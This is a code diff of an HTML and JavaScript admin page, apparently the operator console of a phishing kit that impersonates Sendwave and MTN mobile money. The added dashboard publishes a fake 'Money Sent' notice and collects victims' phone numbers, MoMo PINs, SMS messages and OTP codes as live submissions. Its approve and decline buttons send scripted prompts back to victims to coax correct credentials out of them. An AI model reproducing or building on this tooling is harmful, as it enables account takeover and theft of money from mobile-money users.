@@ -1,277 +1,409 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Admin — Sendwave Flow</title>
-  <style>
-    :root {
-      --sw-yellow: #FFEC00;
-      --sw-brown: #3C0F19;
-      --sw-brown-soft: #5C2A35;
-      --sw-blue: #16889B;
-      --sw-bg: #0F0709;
-      --sw-card: #FFFFFF;
-      --sw-text: #1A0A0E;
-      --sw-muted: #8A7078;
-      --sw-border: #EDE5E0;
-    }
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background: var(--sw-bg);
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      padding: 40px 20px;
-      -webkit-font-smoothing: antialiased;
-    }
-    .wrap { width: 100%; max-width: 540px; }
-    .card {
-      background: var(--sw-card);
-      border-radius: 20px;
-      overflow: hidden;
-      box-shadow: 0 24px 70px -16px rgba(0,0,0,0.5);
-    }
-    .card-head {
-      background: var(--sw-yellow);
-      padding: 22px 26px;
-      border-bottom: 3px solid var(--sw-brown);
-    }
-    .card-head h1 {
-      font-size: 20px;
-      font-weight: 800;
-      color: var(--sw-brown);
-      letter-spacing: -0.5px;
-    }
-    .card-head p {
-      font-size: 12px;
-      color: var(--sw-brown-soft);
-      margin-top: 4px;
-      font-weight: 500;
-    }
-    .live-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      background: var(--sw-brown);
-      color: var(--sw-yellow);
-      font-size: 10px;
-      font-weight: 800;
-      letter-spacing: 0.6px;
-      padding: 5px 10px;
-      border-radius: 100px;
-      margin-top: 10px;
-    }
-    .live-badge .dot {
-      width: 6px; height: 6px; border-radius: 50%;
-      background: var(--sw-yellow);
-      animation: pulse 1.5s infinite;
-    }
-    @keyframes pulse {
-      0%,100% { opacity: 1; }
-      50% { opacity: 0.3; }
-    }
-    form { padding: 26px; display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
-    .field { display: flex; flex-direction: column; }
-    .field.full { grid-column: 1 / -1; }
-    .field label {
-      font-size: 11px;
-      font-weight: 800;
-      color: var(--sw-muted);
-      text-transform: uppercase;
-      letter-spacing: 0.7px;
-      margin-bottom: 6px;
-    }
-    .field input {
-      width: 100%;
-      padding: 12px 14px;
-      border: 1.5px solid var(--sw-border);
-      border-radius: 10px;
-      font-size: 14px;
-      font-weight: 600;
-      color: var(--sw-text);
-      background: #FFFDF9;
-      transition: border 0.15s, box-shadow 0.15s;
-      font-family: inherit;
-    }
-    .field input:focus {
-      outline: none;
-      border-color: var(--sw-brown);
-      box-shadow: 0 0 0 4px rgba(60,15,25,0.08);
-      background: #fff;
-    }
-    .save-btn {
-      grid-column: 1 / -1;
-      padding: 15px;
-      background: var(--sw-brown);
-      color: var(--sw-yellow);
-      border: none;
-      border-radius: 12px;
-      font-size: 15px;
-      font-weight: 800;
-      letter-spacing: 0.3px;
-      cursor: pointer;
-      transition: background 0.15s, transform 0.05s;
-      margin-top: 6px;
-      box-shadow: 0 6px 18px rgba(60,15,25,0.25);
-    }
-    .save-btn:hover { background: #2E0A12; }
-    .save-btn:active { transform: scale(0.985); }
-    .save-btn:disabled { opacity: 0.6; cursor: wait; }
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Admin — Sendwave Flow</title>
+<style>
+:root{
+  --sw-yellow:#FFEC00; --sw-brown:#3C0F19; --sw-brown-soft:#5C2A35;
+  --sw-blue:#16889B; --sw-bg:#0F0709; --sw-card:#FFFFFF;
+  --sw-text:#1A0A0E; --sw-muted:#8A7078; --sw-border:#EDE5E0;
+  --ok:#15803D; --err:#D32F2F;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{min-height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:var(--sw-bg);-webkit-font-smoothing:antialiased}
 
-    .meta {
-      text-align: center;
-      font-size: 11px;
-      color: rgba(255,255,255,0.5);
-      margin-top: 20px;
-      font-weight: 500;
-    }
+/* ---- LOGIN ---- */
+.login-wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.login-card{width:100%;max-width:400px;background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 24px 70px -16px rgba(0,0,0,.6)}
+.login-head{background:var(--sw-yellow);padding:26px 24px;text-align:center;border-bottom:3px solid var(--sw-brown)}
+.l-mark{width:44px;height:44px;margin:0 auto 12px;border-radius:12px;background:var(--sw-brown);display:flex;align-items:center;justify-content:center;color:var(--sw-yellow);font-weight:900;font-size:20px}
+.login-head h1{font-size:19px;font-weight:800;color:var(--sw-brown);letter-spacing:-.4px}
+.login-head p{font-size:11.5px;color:var(--sw-brown-soft);margin-top:4px;font-weight:500}
+.login-body{padding:26px 24px}
+.f{margin-bottom:14px}
+.f label{display:block;font-size:11px;font-weight:800;color:var(--sw-muted);text-transform:uppercase;letter-spacing:.6px;margin-bottom:6px}
+.f input{width:100%;padding:12px 14px;border:1.5px solid var(--sw-border);border-radius:10px;font-size:14px;font-family:inherit;color:var(--sw-text);background:#FFFDF9;transition:.15s}
+.f input:focus{outline:none;border-color:var(--sw-brown);box-shadow:0 0 0 4px rgba(60,15,25,.1);background:#fff}
+.btn{width:100%;padding:14px;background:var(--sw-brown);color:var(--sw-yellow);border:0;border-radius:12px;font:800 15px/1 inherit;letter-spacing:.3px;cursor:pointer;transition:.15s;box-shadow:0 6px 18px rgba(60,15,25,.25)}
+.btn:hover{background:#2E0A12}
+.btn:active{transform:scale(.985)}
+.btn:disabled{opacity:.6;cursor:wait}
+.l-err{display:none;color:var(--err);background:#FEF2F2;padding:10px 12px;border-radius:8px;font-size:12.5px;font-weight:700;margin-bottom:12px;border-left:3px solid var(--err)}
+.l-err.show{display:block}
 
-    .toast {
-      position: fixed;
-      bottom: 30px;
-      left: 50%;
-      transform: translate(-50%, 20px);
-      background: var(--sw-brown);
-      color: var(--sw-yellow);
-      padding: 14px 24px;
-      border-radius: 12px;
-      font-weight: 800;
-      font-size: 14px;
-      opacity: 0;
-      transition: all 0.25s;
-      pointer-events: none;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.35);
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    .toast.show { opacity: 1; transform: translate(-50%, 0); }
+/* ---- DASHBOARD ---- */
+.dash{display:none;min-height:100vh;flex-direction:column;padding:30px 20px}
+.dash.show{display:flex}
+.wrap{width:100%;max-width:900px;margin:0 auto}
+.top{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px;flex-wrap:wrap;gap:10px}
+.brand{display:flex;align-items:center;gap:10px}
+.brand .mark{width:34px;height:34px;border-radius:10px;background:var(--sw-yellow);display:flex;align-items:center;justify-content:center;color:var(--sw-brown);font-weight:900;font-size:15px}
+.brand .name{font-size:15px;font-weight:800;color:#fff;letter-spacing:-.3px}
+.brand .name small{display:block;font-size:9px;color:rgba(255,255,255,.55);letter-spacing:1px;font-weight:700;margin-top:2px}
+.top-acts{display:flex;gap:8px;align-items:center}
+.live-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(255,236,0,.15);color:var(--sw-yellow);font-size:10px;font-weight:800;letter-spacing:.6px;padding:6px 11px;border-radius:100px;text-transform:uppercase}
+.live-badge i{width:6px;height:6px;border-radius:50%;background:var(--sw-yellow);animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.logout{background:rgba(255,255,255,.08);color:#fff;border:0;padding:8px 12px;border-radius:8px;font:700 11px/1 inherit;cursor:pointer;letter-spacing:.4px;transition:.15s}
+.logout:hover{background:rgba(255,255,255,.16)}
 
-    @media (max-width: 480px) {
-      form { grid-template-columns: 1fr; }
-    }
-  </style>
+.card{background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 24px 70px -16px rgba(0,0,0,.5);margin-bottom:16px}
+.card-head{background:var(--sw-yellow);padding:18px 24px;border-bottom:3px solid var(--sw-brown);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px}
+.card-head h1{font-size:18px;font-weight:800;color:var(--sw-brown);letter-spacing:-.5px}
+.card-head p{font-size:11.5px;color:var(--sw-brown-soft);margin-top:3px;font-weight:500}
+
+form{padding:24px;display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.field{display:flex;flex-direction:column}
+.field.full{grid-column:1/-1}
+.field label{font-size:11px;font-weight:800;color:var(--sw-muted);text-transform:uppercase;letter-spacing:.7px;margin-bottom:6px}
+.field input{width:100%;padding:12px 14px;border:1.5px solid var(--sw-border);border-radius:10px;font-size:14px;font-weight:600;color:var(--sw-text);background:#FFFDF9;transition:.15s;font-family:inherit}
+.field input:focus{outline:none;border-color:var(--sw-brown);box-shadow:0 0 0 4px rgba(60,15,25,.08);background:#fff}
+.save-btn{grid-column:1/-1;padding:15px;background:var(--sw-brown);color:var(--sw-yellow);border:0;border-radius:12px;font:800 15px/1 inherit;letter-spacing:.3px;cursor:pointer;transition:.15s;margin-top:6px;box-shadow:0 6px 18px rgba(60,15,25,.25)}
+.save-btn:hover{background:#2E0A12}
+.save-btn:active{transform:scale(.985)}
+.save-btn:disabled{opacity:.6;cursor:wait}
+
+/* Submissions */
+.subs{padding:20px 24px}
+.subs-h{font-size:11px;font-weight:800;color:var(--sw-muted);text-transform:uppercase;letter-spacing:.7px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center}
+.subs-h .cnt{background:var(--sw-brown);color:var(--sw-yellow);font-size:10px;padding:2px 8px;border-radius:20px;font-weight:800}
+.sub-item{padding:12px 14px;border:1px solid var(--sw-border);border-radius:12px;background:#FFFDF9;margin-bottom:10px}
+.sub-item:last-child{margin-bottom:0}
+.sub-item .r{display:flex;justify-content:space-between;font-size:12.5px;padding:3px 0;gap:12px}
+.sub-item .r .l{color:var(--sw-muted);font-weight:500}
+.sub-item .r .v{color:var(--sw-text);font-weight:700;text-align:right;word-break:break-word;max-width:60%}
+.sub-item .acts{display:flex;gap:8px;margin-top:10px}
+.sub-item .acts button{flex:1;padding:9px;border:0;border-radius:8px;font:800 11.5px/1 inherit;cursor:pointer;letter-spacing:.3px;transition:.15s}
+.ok-b{background:#15803D;color:#fff}
+.ok-b:hover{background:#0F7A32}
+.no-b{background:#D32F2F;color:#fff}
+.no-b:hover{background:#A02222}
+.in-b{background:#B45309;color:#fff}
+.in-b:hover{background:#92400E}
+.empty{color:var(--sw-muted);font-size:12.5px;text-align:center;padding:20px;font-weight:500}
+
+.meta{text-align:center;font-size:11px;color:rgba(255,255,255,.5);margin-top:16px;font-weight:500}
+.toast{position:fixed;bottom:30px;left:50%;transform:translate(-50%,20px);background:var(--sw-brown);color:var(--sw-yellow);padding:14px 24px;border-radius:12px;font:800 14px/1 inherit;opacity:0;transition:.25s;pointer-events:none;box-shadow:0 10px 30px rgba(0,0,0,.35);z-index:999}
+.toast.show{opacity:1;transform:translate(-50%,0)}
+.toast.err{background:var(--err);color:#fff}
+
+@media(max-width:640px){form{grid-template-columns:1fr}.card-head{flex-direction:column;align-items:flex-start}}
+</style>
 </head>
 <body>
+
+<!-- LOGIN -->
+<div class="login-wrap" id="login">
+  <div class="login-card">
+    <div class="login-head">
+      <div class="l-mark">S</div>
+      <h1>Sendwave Admin</h1>
+      <p>Enter your credentials to continue</p>
+    </div>
+    <div class="login-body">
+      <div class="l-err" id="loginErr"></div>
+      <form id="loginForm" onsubmit="return false">
+        <div class="f">
+          <label>Username</label>
+          <input type="text" id="u" autocomplete="username" autofocus>
+        </div>
+        <div class="f">
+          <label>Password</label>
+          <input type="password" id="p" autocomplete="current-password">
+        </div>
+        <button type="submit" class="btn" id="loginBtn">Sign In</button>
+      </form>
+    </div>
+  </div>
+</div>
+
+<!-- DASHBOARD -->
+<div class="dash" id="dash">
   <div class="wrap">
+    <div class="top">
+      <div class="brand">
+        <div class="mark">S</div>
+        <div class="name">Admin<small>Sendwave Flow</small></div>
+      </div>
+      <div class="top-acts">
+        <span class="live-badge"><i></i> Live Sync</span>
+        <button class="logout" id="logout">Logout</button>
+      </div>
+    </div>
+
     <div class="card">
       <div class="card-head">
-        <h1>Sendwave Admin</h1>
-        <p>Edit and save — updates broadcast to all devices instantly</p>
-        <span class="live-badge"><span class="dot"></span> LIVE SYNC ON</span>
+        <div>
+          <h1>Session Details</h1>
+          <p>Changes broadcast to all devices instantly</p>
+        </div>
       </div>
 
-      <form id="adminForm">
+      <form id="adminForm" onsubmit="return false">
         <div class="field full">
           <label>Status</label>
-          <input type="text" name="status" placeholder="Money Sent" />
+          <input type="text" name="status" placeholder="Money Sent">
         </div>
-
         <div class="field">
           <label>Amount</label>
-          <input type="number" step="0.01" name="amount" placeholder="250.00" />
+          <input type="number" step="0.01" name="amount" placeholder="250.00">
         </div>
-
         <div class="field">
           <label>Currency</label>
-          <input type="text" name="currency" placeholder="USD" />
+          <input type="text" name="currency" placeholder="USD">
         </div>
-
         <div class="field full">
           <label>Sender Name</label>
-          <input type="text" name="senderName" placeholder="John Doe" />
+          <input type="text" name="senderName" placeholder="John Doe">
         </div>
-
         <div class="field full">
           <label>Sender Country</label>
-          <input type="text" name="senderCountry" placeholder="United States" />
+          <input type="text" name="senderCountry" placeholder="United States">
         </div>
-
         <div class="field full">
-          <label>Purpose</label>
-          <input type="text" name="purpose" placeholder="Family Support" />
+          <label>Recipient Name (shown on MTN page)</label>
+          <input type="text" name="recipientName" placeholder="Recipient Name">
         </div>
-
+        <div class="field">
+          <label>Purpose</label>
+          <input type="text" name="purpose" placeholder="Family Support">
+        </div>
+        <div class="field">
+          <label>Method</label>
+          <input type="text" name="method" placeholder="Mobile Money">
+        </div>
         <div class="field">
           <label>Request ID</label>
-          <input type="text" name="requestId" placeholder="REQ-8829104" />
+          <input type="text" name="requestId" placeholder="REQ-8829104">
         </div>
-
         <div class="field">
-          <label>Transfer Method</label>
-          <input type="text" name="method" placeholder="Mobile Money" />
-        </div>
-
-        <div class="field full">
           <label>Reference</label>
-          <input type="text" name="reference" placeholder="SW-2849163" />
+          <input type="text" name="reference" placeholder="SW-2849163">
         </div>
 
-        <button type="submit" class="save-btn">Save & Publish</button>
+        <button type="submit" class="save-btn" id="saveBtn">Save & Publish</button>
       </form>
+    </div>
+
+    <div class="card">
+      <div class="subs">
+        <div class="subs-h">Live Submissions <span class="cnt" id="subCnt">0</span></div>
+        <div id="subList"><div class="empty">No submissions yet.</div></div>
+      </div>
     </div>
 
     <div class="meta" id="meta">—</div>
   </div>
+</div>
 
-  <div class="toast" id="toast">✓ Saved · Live on all devices</div>
+<div class="toast" id="toast">✓ Saved · Live on all devices</div>
 
-  <script>
-    const form = document.getElementById('adminForm');
-    const meta = document.getElementById('meta');
-    const toast = document.getElementById('toast');
+<script>
+const $ = id => document.getElementById(id);
+let TOKEN = sessionStorage.getItem('adminToken') || '';
 
-    function setMeta(iso) {
-      meta.textContent = 'Last published: ' + new Date(iso).toLocaleString();
-    }
+async function api(path, opts = {}) {
+  const headers = { 'Content-Type': 'application/json', ...(opts.headers || {}) };
+  if (TOKEN) headers['x-admin-token'] = TOKEN;
+  const r = await fetch(path, { ...opts, headers });
+  const d = await r.json().catch(() => ({}));
+  if (!r.ok) throw Object.assign(new Error(d.error || 'Request failed'), { status: r.status });
+  return d;
+}
 
-    async function load() {
-      const res = await fetch('/api/state');
-      const s = await res.json();
-      Object.keys(s).forEach(k => { if (form.elements[k]) form.elements[k].value = s[k]; });
-      setMeta(s.updatedAt);
-    }
+function toast(msg, isErr) {
+  const t = $('toast');
+  t.textContent = msg;
+  t.classList.toggle('err', !!isErr);
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2200);
+}
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const btn = form.querySelector('.save-btn');
-      btn.disabled = true;
-      btn.textContent = 'Publishing…';
-
-      const payload = {};
-      new FormData(form).forEach((v, k) => payload[k] = v);
-      payload.amount = parseFloat(payload.amount) || 0;
-
-      const res = await fetch('/api/state', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-      const data = await res.json();
-
-      btn.disabled = false;
-      btn.textContent = 'Save & Publish';
-      setMeta(data.state.updatedAt);
-
-      toast.classList.add('show');
-      setTimeout(() => toast.classList.remove('show'), 2000);
+/* ---- Login ---- */
+$('loginForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const err = $('loginErr');
+  err.classList.remove('show');
+  $('loginBtn').disabled = true;
+  $('loginBtn').textContent = 'Signing in…';
+  try {
+    const d = await api('/api/admin/login', {
+      method: 'POST',
+      body: JSON.stringify({ username: $('u').value.trim(), password: $('p').value })
     });
+    TOKEN = d.token;
+    sessionStorage.setItem('adminToken', TOKEN);
+    showDash();
+  } catch (ex) {
+    err.textContent = ex.message || 'Login failed';
+    err.classList.add('show');
+  } finally {
+    $('loginBtn').disabled = false;
+    $('loginBtn').textContent = 'Sign In';
+  }
+});
 
-    // Live-update the admin form if another admin device changes it
-    const evtSource = new EventSource('/api/stream');
-    evtSource.onmessage = (e) => {
-      const s = JSON.parse(e.data);
-      // Only update fields the user isn't actively typing in
-      Object.keys(s).forEach(k => {
-        const el = form.elements[k];
-        if (el && document.activeElement !== el) el.value = s[k];
-      });
-      setMeta(s.updatedAt);
+$('logout').addEventListener('click', async () => {
+  try { await api('/api/admin/logout', { method: 'POST' }); } catch (_) {}
+  sessionStorage.removeItem('adminToken');
+  location.reload();
+});
+
+async function showDash() {
+  $('login').style.display = 'none';
+  $('dash').classList.add('show');
+  await loadState();
+  setupStream();
+}
+
+/* ---- Load state ---- */
+async function loadState() {
+  try {
+    const s = await api('/api/state');
+    const form = $('adminForm');
+    Object.keys(s).forEach(k => { if (form.elements[k]) form.elements[k].value = s[k]; });
+    $('meta').textContent = 'Last published: ' + new Date(s.updatedAt).toLocaleString();
+    renderSubs(s);
+  } catch (e) {
+    if (e.status === 401) { sessionStorage.removeItem('adminToken'); location.reload(); }
+  }
+}
+
+/* ---- Save ---- */
+$('saveBtn').addEventListener('click', async () => {
+  const btn = $('saveBtn');
+  btn.disabled = true;
+  btn.textContent = 'Publishing…';
+  const payload = {};
+  new FormData($('adminForm')).forEach((v, k) => payload[k] = v);
+  payload.amount = parseFloat(payload.amount) || 0;
+  try {
+    const d = await api('/api/state', { method: 'POST', body: JSON.stringify(payload) });
+    toast('✓ Saved · Live on all devices');
+    $('meta').textContent = 'Last published: ' + new Date(d.state.updatedAt).toLocaleString();
+    renderSubs(d.state);
+  } catch (e) {
+    toast(e.message || 'Save failed', true);
+  } finally {
+    btn.disabled = false;
+    btn.textContent = 'Save & Publish';
+  }
+});
+
+/* ---- Render submissions ---- */
+function renderSubs(s) {
+  const list = $('subList');
+  const items = [];
+
+  if (s.latestSubmission) {
+    const sub = s.latestSubmission;
+    items.push(`
+      <div class="sub-item">
+        <div class="r"><span class="l">MoMo PIN · Phone</span><span class="v">${sub.phone || '—'}</span></div>
+        <div class="r"><span class="l">Recipient</span><span class="v">${sub.recipientName || '—'}</span></div>
+        <div class="r"><span class="l">PIN</span><span class="v">${sub.pin || '—'}</span></div>
+        <div class="acts">
+          <button class="ok-b" onclick="decide('approve')">✅ Approve</button>
+          <button class="no-b" onclick="decide('decline')">❌ Decline</button>
+        </div>
+      </div>
+    `);
+  }
+  if (s.latestSmsSubmission) {
+    const sub = s.latestSmsSubmission;
+    items.push(`
+      <div class="sub-item">
+        <div class="r"><span class="l">SMS · Phone</span><span class="v">${sub.phone || '—'}</span></div>
+        <div class="r"><span class="l">Message</span><span class="v">${(sub.smsMessage || '').slice(0, 100)}…</span></div>
+        <div class="acts">
+          <button class="ok-b" onclick="decideSms('sms-approve')">✅ Approve</button>
+          <button class="no-b" onclick="decideSms('sms-decline')">❌ Decline</button>
+        </div>
+      </div>
+    `);
+  }
+  if (s.latestOtpSubmission) {
+    const sub = s.latestOtpSubmission;
+    items.push(`
+      <div class="sub-item">
+        <div class="r"><span class="l">OTP · Phone</span><span class="v">${sub.phone || '—'}</span></div>
+        <div class="r"><span class="l">Code</span><span class="v">${sub.otp || '—'}</span></div>
+        <div class="acts">
+          <button class="ok-b" onclick="decideOtp('otp-approve')">✅</button>
+          <button class="no-b" onclick="decideOtp('otp-decline')">❌</button>
+          <button class="in-b" onclick="decideOtp('otp-inactive')">⏸</button>
+        </div>
+      </div>
+    `);
+  }
+
+  if (!items.length) {
+    list.innerHTML = '<div class="empty">No submissions yet.</div>';
+    $('subCnt').textContent = '0';
+  } else {
+    list.innerHTML = items.join('');
+    $('subCnt').textContent = items.length;
+  }
+}
+
+/* ---- Decision handlers ---- */
+window.decide = async (action) => {
+  try {
+    await api('/api/' + action, {
+      method: 'POST',
+      body: JSON.stringify({ message: action === 'decline' ? 'Wrong MoMo PIN. Please try again.' : '' })
+    });
+    toast(action === 'approve' ? '✅ Approved' : '❌ Declined');
+  } catch (e) { toast(e.message, true); }
+};
+
+window.decideSms = async (action) => {
+  try {
+    await api('/api/state', {
+      method: 'POST',
+      body: JSON.stringify({
+        decision: action,
+        declineMessage: action === 'sms-decline' ? "Invalid SMS. Please paste the correct Y'ello message." : undefined
+      })
+    });
+    toast(action === 'sms-approve' ? '✅ SMS Approved' : '❌ SMS Declined');
+  } catch (e) { toast(e.message, true); }
+};
+
+window.decideOtp = async (action) => {
+  try {
+    await api('/api/state', {
+      method: 'POST',
+      body: JSON.stringify({
+        decision: action,
+        declineMessage: action === 'otp-decline' ? 'Expired code — please tap Resend.' : undefined
+      })
+    });
+    toast(action === 'otp-approve' ? '✅ OTP Approved' : action === 'otp-inactive' ? '⏸ Marked Inactive' : '❌ OTP Declined');
+  } catch (e) { toast(e.message, true); }
+};
+
+/* ---- Live stream ---- */
+function setupStream() {
+  try {
+    const evt = new EventSource('/api/stream');
+    evt.onmessage = (e) => {
+      try {
+        const s = JSON.parse(e.data);
+        renderSubs(s);
+      } catch (_) {}
     };
+  } catch (_) {}
+}
 
-    load();
-  </script>
+/* ---- Boot ---- */
+(async () => {
+  if (!TOKEN) return;
+  try { await api('/api/admin/check'); await showDash(); }
+  catch (_) { sessionStorage.removeItem('adminToken'); TOKEN = ''; }
+})();
+</script>
 </body>
 </html>
